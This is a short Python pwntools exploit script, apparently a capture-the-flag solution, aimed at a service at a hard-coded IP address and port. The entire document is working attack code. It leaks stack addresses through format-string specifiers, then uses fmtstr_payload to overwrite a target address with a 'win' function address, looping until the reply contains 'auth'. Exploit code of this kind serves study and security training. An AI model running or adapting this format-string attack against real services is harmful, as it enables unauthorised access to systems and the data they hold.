#!/usr/bin/python3
from pwn import *


def exploit():

    payload_index = 75  # Starting index for payload

    while True:
        context.clear(endian="little")
        context.clear(arch="amd64")
        p = remote("195.37.209.19", 9001)

        payload = b"%72$p"
        payload = payload + b"%" + str(payload_index).encode() + b"$p"
        p.sendline(payload)

        p.sendline(b"secret")
        vals = p.recvline().strip()[19:].split()

        win_addr = int(vals[0][2:], 16)
        target_addr = int(vals[1][2:], 16)

        context.bits = 64

        p.sendline(fmtstr_payload(8, {target_addr: win_addr}, 0))
        response = p.recvall()
        if b"auth" in response:
            print(response)
            break
        payload_index += 1


exploit()
